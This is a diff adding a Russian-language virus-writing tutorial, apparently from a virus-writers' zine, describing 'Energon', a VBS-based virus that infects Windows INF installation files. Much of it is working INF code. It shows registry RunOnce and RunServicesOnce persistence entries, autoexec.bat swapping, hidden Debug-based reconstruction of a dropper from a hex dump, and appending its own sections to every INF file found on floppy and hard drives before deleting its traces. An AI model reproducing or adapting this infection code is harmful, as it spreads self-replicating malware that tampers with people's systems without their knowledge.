@@ -1,0 +1,292 @@
+
+                         Energon INF вирус на VBS
+
+                                                          by VOVAN // SMF
+
+  Вирус  заражающий  инсталляционные  INF-файлы  Windows,  т.е. *.inf при
+ установке  какого  либо  оборудования  модема,  видео  карты, монитора и
+ других  устройств  Windows  ищет  INF-файлы  и обрабатывает их, выполняя
+ скрипт-инструкции.
+
+  Вирус  состоит из двух частей inf-файла и вложенного в него дроппера на
+ VBS  При  активизации  вирусный  скрипт  копирует текущий файл в каталог
+ Windows с помощью секции [Host_Energon.File] которая получит управление.
+
+ [Host_Energon.File]
+ Energon.inf, <имя текущего файла>
+
+  Секция  [DestinationDirs]  служит для указания пути для других секций и
+ инструкций, например куда копировать или где переименовывать и т.д.
+
+ [DestinationDirs]
+ Host_Energon.File  = 10        ; WINDOWS
+ Copy_Auto_Bak.Ren  = 30        ; C:\
+ Rename_bat_vbs.Ren = 30        ; C:\
+ Ren_bak_bat.Ren    = 30        ; C:\
+
+  далее прописываем команду запуска, в реестр в секцию
+
+ HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Install_Energon 64 %10%\energon.inf"
+
+ для дальнейшей инсталляции и распространения вируса
+
+ RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Install_Energon 64 %10%\energon.inf
+
+  данная    команда    после   перезапуска   Windows   запускает   секцию
+ [Install_Energon] в %10%\energon.inf файле, где %10% это путь к каталогу
+ Windows После чего и начинается инсталляция вируса в систему.
+
+ Секция [Install_Energon] состоит из четырех инструкций
+
+ [Install_Energon]
+ UpdateInis = Energon_dump
+ RenFiles = Copy_Auto_Bak.Ren
+ UpdateAutoBat = Energon_Attach
+ AddReg = Run_Ren_Auto_Bat.reg
+
+ первая инструкция
+
+ UpdateInis = Energon_dump
+
+  инструкция  UpdateInis  служит  для внесения изменений в ini-файлы я ее
+ использовал для создания файла enr.drv в каталоге Windows т.к. этот файл
+ изначально  не  существует,  Windows создает его используя инструкции из
+ секции Energon_dump
+
+ Секция [Energon_dump] состоит из следующих инструкций
+
+ [Energon_dump]
+ %10%\enr.drv,-,,"N %10%\ENERGON.VBS"
+ %10%\enr.drv,-,,".........................................."
+ %10%\enr.drv,-,,".........................................."
+ %10%\enr.drv,-,,".........................................."
+
+ Где
+
+ %10%\enr.drv,-,,"...."
+
+ %10%     - каталог Windows
+ \enr.drv - имя файла для внесения изменений (в данном случаи для записи
+            шестнадцатеричного дампа)
+ ,-,,     - имя секции в ini-файле вместо "-" можно записать любое имя
+ "...."   - сам шестнадцатеричный дамп
+
+  После  выполнения  секции  [Energon_dump] в каталоге Windows появляется
+ файл с именем enr.drv который содержит шестнадцатеричный дамп дроппера
+
+  Далее переходим ко второй инструкции в секции [Install_Energon]
+
+ RenFiles = Copy_Auto_Bak.Ren
+
+  Инструкция RenFiles служит для переименования файлов.
+  Инструкции    для    переименования    файлов    находятся   в   секции
+ Copy_Auto_Bak.Ren
+
+ Секция [Copy_Auto_Bak.Ren] состоит из следующих инструкций
+
+ [Copy_Auto_Bak.Ren]
+ autoexec.bak,autoexec.bat
+
+  с  начало  идет  новое имя файла, а потом старое т.е. файл autoexec.bat
+ переименовывается в autoexec.bak
+
+  Далее переходим к третьей инструкции в секции [Install_Energon]
+
+ UpdateAutoBat = Energon_Attach
+
+  Инструкция   UpdateAutoBat   служит   для  внесения  изменений  в  файл
+ autoexec.bat   но   т.к.   в   предыдущей   секции   [Copy_Auto_Bak.Ren]
+ autoexec.bat  был  переименован  в  autoexec.bak и autoexec.bat уже нет,
+ инструкция  UpdateAutoBat  создаст  новый  файл autoexec.bat и запишет в
+ него   vbs-файл   инструкции   для   его  создания  находятся  в  секции
+ Energon_Attach
+
+ Секция [Energon_Attach] состоит из следующих инструкций
+
+ [Energon_Attach]
+ CmdAdd="On","Error Resume Next"
+ CmdAdd="Set","A=CreateObject(""Scripting.FileSystemObject"")"
+ CmdAdd="CreateObject","(""WScript.Shell"").Run (""Command.com /c Debug < %10%\enr.drv""),0"
+ CmdAdd="'A.MoveFile","""%30%\autoexec.bak"",""%30%\autoexec.bat"""
+ CmdAdd="Do"
+ CmdAdd="If","A.FileExists(A.GetSpecialFolder(0)&""\energon.vbs"")<>False Then Exit Do"
+ CmdAdd="Loop"
+ CmdAdd="CreateObject","(""WScript.Shell"").Run (""%10%\wscript.exe %10%\energon.vbs""),0"
+ CmdAdd="A.DeleteFile","(""%10%\enr.drv""),1"
+ CmdAdd="A.DeleteFile","(""%30%\tmp.vbs""),1"
+
+  Инструкция CmdAdd служит для добавления строк заключенных в кавычки
+
+  Далее переходим к четвертой инструкции в секции [Install_Energon]
+
+ AddReg = Run_Ren_Auto_Bat.reg
+
+  Инструкция  AddReg  служит  для  добавления в реестр различных записей,
+ команд находящихся в секции Run_Ren_Auto_Bat.reg
+
+  Секция [Run_Ren_Auto_Bat.reg] состоит из следующих инструкций
+
+ [Run_Ren_Auto_Bat.reg]
+ HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Ren_Auto_Bat 64 %10%\energon.inf"
+
+  Запись  в секцию HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+ в реестр равносильно немедленному запуску той команды или файла, который
+ в нее записывается в данном случае это команда
+
+ RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Ren_Auto_Bat 64 %10%\energon.inf
+
+ которая запускает [Ren_Auto_Bat] секцию в файле %10%\energon.inf
+
+ Секция [Ren_Auto_Bat] состоит из двух инструкций
+
+ [Ren_Auto_Bat]
+ RenFiles = Rename_bat_vbs.Ren
+ AddReg = Rename_bak_bat.reg
+
+ инструкция RenFiles = Rename_bat_vbs.Ren служит для переименования файлов
+ находящихся в секции Rename_bat_vbs.Ren
+
+ Cекция [Rename_bat_vbs.Ren] состоит из следующих инструкций
+
+ [Rename_bat_vbs.Ren]
+ tmp.vbs,autoexec.bat
+
+ файл autoexec.bat переименовывается в tmp.vbs
+
+ Вторая инструкция в секции [Ren_Auto_Bat]
+
+ AddReg = Rename_bak_bat.reg
+
+ [Rename_bak_bat.reg]
+ HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Ren_bak_bat_run 64 %10%\energon.inf"
+
+ нужна для запуска секции [Ren_bak_bat_run] в файле %10%\energon.inf
+
+ Далее секция [Ren_bak_bat_run] состоит из двух инструкций
+
+ [Ren_bak_bat_run]
+ RenFiles = Ren_bak_bat.Ren
+ AddReg = Run_tmp.reg
+
+ инструкция RenFiles = Ren_bak_bat.Ren служит для переименования файлов
+ находящихся в секции Ren_bak_bat.Ren
+
+ [Ren_bak_bat.Ren]
+ autoexec.bat,autoexec.bak
+
+  переименовываем  autoexec.bak  в autoexec.bat, т.е. восстанавливаем его
+ назад как было.
+
+ Вторая инструкция в секции [Ren_bak_bat_run]
+
+ AddReg = Run_tmp.reg
+
+ [Run_tmp.reg]
+ HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"%10%\wscript.exe %30%\tmp.vbs //B"
+
+  нужна  для  запуска  vbs-файла с именем tmp.vbs, который в дальнейшем с
+ помощью  команды  "Command.com  /c  Debug < %10%\enr.drv" в скрытом окне
+ преобразует шестнадцатеричный дамп в файл energon.vbs в каталоге Windows
+ затем  после  преобразования запустит его, т.е. дроппер в скрытом окне и
+ удалит вспомогательные файлы enr.drv и себя tmp.vbs
+
+  Далее файл дроппер energon.vbs
+
+  Дроппер  считывает  из файла energon.inf находящимся в каталоге Windows
+ начиная с секции [Energon_dump] до комментария ";Energon" находящегося в
+ конце  файла  шестнадцатеричный дамп потом начинает поиск по маске *.inf
+ на  диске  A:\  и  всех HDD в каждом *.inf-файле ищется секция [Version]
+ т.о.  вирус  различает  инсталляционные  INF-файлы Windows, если ее нет,
+ файл пропускается каждый найденный файл проверяет на зараженность.
+
+  И если файл не заражен вирус ищет в каждой секции инструкции, CopyFiles
+ проверяет в них наличие записи Host_Energon.File, если такой записи нет,
+ дописывает  в  конце  строки ",Host_Energon.File" также ищет, инструкции
+ AddReg  проверяет  в них наличие записи Inst_Run, если такой записи нет,
+ дописывает  в  конце  строки ",Inst_Run" если в секции не хватает, какой
+ нибудь  одной инструкции будь то CopyFiles или AddReg вирус дописывает в
+ секцию нехватающюю инструкцию
+
+ CopyFiles = Host_Energon.File
+        или
+ AddReg = Inst_Run
+
+  далее  вирус  ищет секцию [DestinationDirs] для записи в нее инструкций
+ необходимых вирусу если таковой нет, вирус создает ее.
+
+ Host_Energon.File  = 10        ; WINDOWS
+ Copy_Auto_Bak.Ren  = 30        ; C:\
+ Rename_bat_vbs.Ren = 30        ; C:\
+ Ren_bak_bat.Ren    = 30        ; C:\
+
+  далее  вирус  ищет  секцию  [DefaultInstall] для записи в нее следующих
+ инструкций
+
+ CopyFiles = Host_Energon.File
+ AddReg = Inst_Run
+
+  Эта секция в inf-файлах срабатывает при нажатии на выделенном inf-файле
+ правой клавишей мышки в открывшемся меню на пункте "Установить"
+
+ если [DefaultInstall] секции нет, вирус создает ее.
+
+  Далее  вирус  переходит  на  конец  файла-жертвы  и  дописывает  в него
+ следующие секции и инструкции, о которых рассказано выше.
+
+ [Inst_Run]
+ HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Install_Energon 64 %10%\energon.inf"
+ [Install_Energon]
+ UpdateInis = Energon_dump
+ RenFiles  = Copy_Auto_Bak.Ren
+ UpdateAutoBat = Energon_Attach
+ AddReg = Run_Ren_Auto_Bat.reg
+ [Copy_Auto_Bak.Ren]
+ autoexec.bak,autoexec.bat
+ [Run_Ren_Auto_Bat.reg]
+ HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Ren_Auto_Bat 64 %10%\energon.inf"
+ [Ren_Auto_Bat]
+ RenFiles = Rename_bat_vbs.Ren
+ AddReg = Rename_bak_bat.reg
+ [Rename_bat_vbs.Ren]
+ tmp.vbs,autoexec.bat
+ [Rename_bak_bat.reg]
+ HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"RUNDLL.EXE %11%\setupx.dll,InstallHinfSection Ren_bak_bat_run 64 %10%\energon.inf"
+ [Ren_bak_bat_run]
+ RenFiles = Ren_bak_bat.Ren
+ AddReg = Run_tmp.reg
+ [Ren_bak_bat.Ren]
+ autoexec.bat,autoexec.bak
+ [Run_tmp.reg]
+ HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Run,,"%10%\wscript.exe %30%\tmp.vbs //B"
+ [Host_Energon.File]
+ Energon.inf, Energon.inf
+ [Energon_Attach]
+ CmdAdd="On","Error Resume Next"
+ CmdAdd="Set","A=CreateObject(""Scripting.FileSystemObject"")"
+ CmdAdd="Set","B=CreateObject(""WScript.Shell"")"
+ CmdAdd="B.Run",""(""Command.com /c Debug < %10%\enr.drv""),0"
+ CmdAdd="Do"
+ CmdAdd="If","A.FileExists(A.GetSpecialFolder(0)&""\energon.vbs"")<>False Then Exit Do"
+ CmdAdd="Loop"
+ CmdAdd="B.Run","(""%10%\wscript.exe %10%\energon.vbs""),0"
+ CmdAdd="A.DeleteFile","(""%10%\enr.drv""),1"
+ CmdAdd="A.DeleteFile","(""%30%\tmp.vbs""),1"
+
+ Потом вирус дописывает считанный из файла energon.inf шестнадцатеричный дамп
+
+ [Energon_dump]
+ ......................
+ шестнадцатеричный дамп
+ ......................
+ ;Energon
+
+ и закрывает файл-жертву
+ и так пока не заразим все
+ после   заражения  всех  inf-файлов  удалим  файл  energon.inf  и  себя
+ energon.vbs в каталоге Windows.
+
+ Energon.a работает медленнее.
+ Energon.b работает быстрее.
+
+
+ 
